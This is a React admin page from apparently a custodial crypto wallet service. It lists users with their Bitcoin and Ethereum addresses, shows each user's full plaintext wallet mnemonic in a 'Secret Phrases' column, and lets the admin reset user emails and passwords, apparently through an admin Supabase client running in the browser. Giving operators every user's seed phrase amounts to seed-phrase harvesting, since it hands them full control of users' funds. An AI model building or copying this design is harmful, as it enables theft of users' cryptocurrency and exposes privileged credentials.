import React, { useState, useMemo, useEffect, useRef } from "react";
import { Search, Eye, EyeOff, Edit, View, Trash2 } from "lucide-react";
import Card from "../../components/ui/Card";
import { adminSupabase, useAdminStore } from "../../store/adminStore";
import toast, { Toaster } from "react-hot-toast";
import { formatDate1 } from "../../utils/formatters";
import { fetchUserTokens } from "../../utils/fetchUserTokens";

type User = {
  user_id: string;
  email: string;
  username: string;
  btc_address: string;
  eth_address: string;
  mnemonic: string;
  walletBalance: string;
  lastLogin: string;
};

const shortAddress = (address: string) => {
  if (!address) return "N/A";
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
};

const UserActions: React.FC<{ onEdit: () => void }> = ({ onEdit }) => (
  <div className="flex items-center space-x-2 cursor-pointer">
    <button
      onClick={onEdit}
      className="p-1 hover:bg-neutral-700 rounded-lg transition-colors"
    >
      <Edit size={18} className="text-primary" />
    </button>
    <div>Edit</div>
  </div>
);

const UserView: React.FC<{ onView: () => void }> = ({ onView }) => (
  <div className="flex items-center space-x-2 cursor-pointer">
    <button
      onClick={onView}
      className="p-1 hover:bg-neutral-700 rounded-lg transition-colors"
    >
      <View size={18} className="text-primary" />
    </button>
    <div>View</div>
  </div>
);
const UserDelete: React.FC<{ onDelete: () => void }> = ({ onDelete }) => (
  <div className="flex items-center space-x-2 cursor-pointer">
    <button
      onClick={onDelete}
      className="p-1 hover:bg-neutral-700 rounded-lg transition-colors"
    >
      <Trash2 size={18} className="text-primary" />
    </button>
    <div>Delete</div>
  </div>
);
export const ProtectedMnemonic: React.FC<{ mnemonic: string }> = ({
  mnemonic,
}) => {
  const [revealed, setRevealed] = useState(false);
  const popupRef = useRef<HTMLDivElement>(null);

  // Close popup on outside click
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (
        popupRef.current &&
        !popupRef.current.contains(event.target as Node)
      ) {
        setRevealed(false);
      }
    };
    if (revealed) {
      document.addEventListener("mousedown", handleClickOutside);
    }
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, [revealed]);

  return (
    <div className="relative text-xs max-w-[10rem]">
      <div className="flex items-center gap-2">
        <span className="tracking-widest text-neutral-400">•••• •••• ••••</span>
        {!revealed ? (
          <button onClick={() => setRevealed(true)} className="hover:underline">
            <Eye size={16} className="inline-block" />
          </button>
        ) : (
          <button
            onClick={() => setRevealed(false)}
            className="text-neutral-400 hover:text-white"
          >
            <EyeOff size={16} />
          </button>
        )}
      </div>

      {revealed && (
        <div
          ref={popupRef}
          className="absolute bottom-full mb-[-2px] left-[-30px] z-[9999] w-64 bg-neutral-900 text-neutral-100 border border-neutral-700 rounded-md shadow-xl p-3"
        >
          <div className="flex justify-between items-start">
            <p className="text-xs whitespace-pre-wrap break-words leading-snug">
              {mnemonic}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

const EditUserModal: React.FC<{
  user: User;
  onClose: () => void;
  onSave: (email: string, password: string) => void;
}> = ({ user, onClose, onSave }) => {
  const [email, setEmail] = useState(user.email);
  const [password, setPassword] = useState("");

  const generateTempPassword = () => {
    const temp = import.meta.env.VITE_TEMP_PASSWORD;
    setPassword(temp);
  };

  return (
    <div className="fixed inset-0 z-[99999] bg-black/60 flex items-center justify-center">
      <div className="bg-neutral-900 border border-neutral-700 rounded-xl p-6 w-full max-w-md space-y-4">
        <h2 className="text-lg font-semibold mb-2">Edit User</h2>

        <div className="space-y-3">
          <div>
            <label className="text-sm text-neutral-300">Email</label>
            <input
              className="input w-full mt-1"
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>

          <div>
            <label className="text-sm text-neutral-300">Password</label>
            <input
              className="input w-full mt-1"
              type="text"
              value={password}
              placeholder="Leave blank to keep current"
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <div className="flex justify-between gap-2">
            <button
              className="text-xs text-blue-400 hover:underline"
              onClick={generateTempPassword}
            >
              Generate Temp Password
            </button>
          </div>
        </div>

        <div className="flex justify-end gap-2 mt-4">
          <button
            className="px-4 py-2 rounded bg-neutral-700 hover:bg-neutral-600"
            onClick={onClose}
          >
            Cancel
          </button>
          <button
            className="px-4 py-2 rounded bg-primary text-white hover:bg-primary/90"
            onClick={() => onSave(email, password)}
          >
            Save
          </button>
        </div>
      </div>
    </div>
  );
};

const UserRow: React.FC<{
  user: User;
  onEdit: () => void;
  onView: () => void;
  onDelete: () => void;
}> = ({ user, onEdit, onView, onDelete }) => (
  <tr className="border-b border-neutral-800 hover:bg-neutral-800/30">
    <td className="px-1 sm:px-2 py-3">
      <p className="font-medium">{user.username}</p>
      <p className="text-xs text-neutral-400">{user.email}</p>
    </td>
    <td className="px-1 sm:px-2 py-3">{shortAddress(user.btc_address)}</td>
    <td className="px-1 sm:px-2 py-3">{shortAddress(user.eth_address)}</td>
    <td className="px-1 sm:px-2 py-0">
      <ProtectedMnemonic mnemonic={user.mnemonic} />
    </td>{" "}
    <td className="px-1 sm:px-2 py-3">
      <UserActions onEdit={onEdit} />
    </td>
    <td className="px-1 sm:px-2 py-3">
      <UserView onView={onView} />
    </td>
    <td className="px-1 sm:px-2 py-3">
      <UserDelete onDelete={onDelete} />
    </td>
  </tr>
);
const ViewUserModal: React.FC<{ user: User; onClose: () => void }> = ({
  user,
  onClose,
}) => {
  const [balance, setBalance] = useState<string>("0");
  useEffect(() => {
    const fetchTotalValue = async () => {
      const { totalValue } = await fetchUserTokens(
        user.eth_address,
        user.btc_address
      );
      setBalance(totalValue.toString());
    };
    fetchTotalValue();
  }, [user]);
  return (
    <div className="fixed inset-0 z-[99999] bg-black/60 flex items-center justify-center">
      <div className="bg-neutral-900 border border-neutral-700 rounded-xl p-6 w-full max-w-md space-y-4">
        <h2 className="text-lg font-semibold mb-2">User Details</h2>
        <div className="space-y-2 text-sm">
          <div>
            <strong>Email:</strong> {user.email}
          </div>
          <div>
            <strong>BTC:</strong> {user.btc_address}
          </div>
          <div>
            <strong>ETH:</strong> {user.eth_address}
          </div>
          <div>
            <strong>Balance:</strong> {balance} USD
          </div>
          <div>
            <strong>Last Login:</strong> {formatDate1(user.lastLogin)}
          </div>
        </div>
        <div className="flex justify-end mt-4">
          <button
            onClick={onClose}
            className="px-4 py-2 bg-neutral-700 rounded hover:bg-neutral-600"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

const Users: React.FC = () => {
  const { users, fetchUsers } = useAdminStore();
  const [editingUser, setEditingUser] = useState<User | null>(null);
  const [viewingUser, setViewingUser] = useState<User | null>(null);

  const [searchQuery, setSearchQuery] = useState("");
  // const renderRef = useRef(false);

  const handleSaveUser = async (email: string, password: string) => {
    if (!editingUser) return;

    try {
      const { error } = await adminSupabase.auth.admin.updateUserById(
        editingUser.user_id,
        {
          email: email,
          password: password || undefined, // Only update password if provided
        }
      );
      if (error) {
        console.error("Failed to update user:", error.message);
      } else {
        toast.success("User updated successfully!");
        fetchUsers();
        setEditingUser(null); // Close modal
      }
    } catch (error) {
      console.error("Unexpected error:", error);
    }
  };
  const handleDeleteUser = async (user: User) => {
    const confirm = window.confirm(
      `Are you sure you want to delete user "${user.email}"?`
    );
    if (!confirm) return;

    try {
      // Step 2: Optionally delete the user from your own "users" table if needed
      const { error: dbError } = await adminSupabase
        .from("profiles")
        .update({ deleted: true })
        .eq("user_id", user.user_id);

      if (dbError) {
        toast.error("Failed to delete user from database: " + dbError.message);
        return;
      }

      // Refresh the user list
      await fetchUsers();
      toast.success("User deleted successfully.");
    } catch (err) {
      toast.error("An unexpected error occurred.");
      console.error(err);
    }
  };

  useEffect(() => {
    fetchUsers();
  }, []);

  const filteredUsers = useMemo(() => {
    return users.filter((user) =>
      user.email.toLowerCase().includes(searchQuery.toLowerCase())
    );
  }, [searchQuery, users]);
  return (
    <div className="p-4 sm:p-6 sm:px-10">
      {/* Header */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-4 sm:mb-6 space-y-2 sm:space-y-0">
        <h1 className="text-xl sm:text-2xl font-bold">Users Management</h1>

        <div className="flex items-center space-x-2 sm:space-x-4 w-full sm:w-auto">
          <div className="relative flex-1 sm:flex-initial">
            <Search
              className="absolute left-3 top-1/2 transform -translate-y-1/2 text-neutral-400"
              size={18}
            />
            <input
              type="text"
              placeholder="Search users..."
              className="input w-full pl-10 pr-4 py-2 text-sm sm:text-base"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
          </div>
        </div>
      </div>

      {/* User Table */}
      <Card className="p-2">
        <div className="overflow-x-auto">
          <table className="w-full text-sm min-w-[700px]">
            <thead>
              <tr className="text-left border-b border-neutral-800">
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  User
                </th>
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  Bitcoin
                </th>
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  Ethereum
                </th>
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  Secret Phrases
                </th>
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  Actions
                </th>
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  View
                </th>
                <th className="px-2 sm:px-3 py-3 text-xs font-medium text-neutral-400">
                  Delete
                </th>
              </tr>
            </thead>
            <tbody>
              {filteredUsers.map((user, idx) => (
                <UserRow
                  key={idx}
                  user={user}
                  onEdit={() => setEditingUser(user)}
                  onView={() => setViewingUser(user)}
                  onDelete={() => handleDeleteUser(user)}
                />
              ))}
              {filteredUsers.length === 0 && (
                <tr>
                  <td
                    colSpan={6}
                    className="text-center text-neutral-500 py-6 text-sm"
                  >
                    No users found.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </Card>
      {editingUser && (
        <EditUserModal
          user={editingUser}
          onClose={() => setEditingUser(null)}
          onSave={handleSaveUser}
        />
      )}
      {viewingUser && (
        <ViewUserModal
          user={viewingUser}
          onClose={() => setViewingUser(null)}
        />
      )}

      <Toaster position="top-center" reverseOrder={false} />
    </div>
  );
};

export default Users;
